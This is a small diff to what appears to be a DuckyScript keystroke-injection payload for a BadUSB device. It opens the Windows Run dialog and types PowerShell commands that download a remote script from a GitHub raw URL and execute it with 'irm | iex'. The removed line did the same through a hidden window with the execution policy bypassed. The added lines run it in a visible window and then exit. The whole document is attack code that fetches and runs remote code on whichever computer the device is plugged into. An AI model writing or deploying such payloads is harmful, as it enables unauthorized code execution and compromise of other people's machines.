@@ -1,4 +1,8 @@
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass irm https://raw.githubusercontent.com/akeendev/powershell-scripts/refs/heads/main/scripts/tepeguei.ps1 | iex
+STRING powershell
+DELAY 500
+STRING irm 'https://raw.githubusercontent.com/akeendev/powershell-scripts/refs/heads/main/scripts/tepeguei.ps1' | iex
+ENTER
+STRING exit
 ENTER
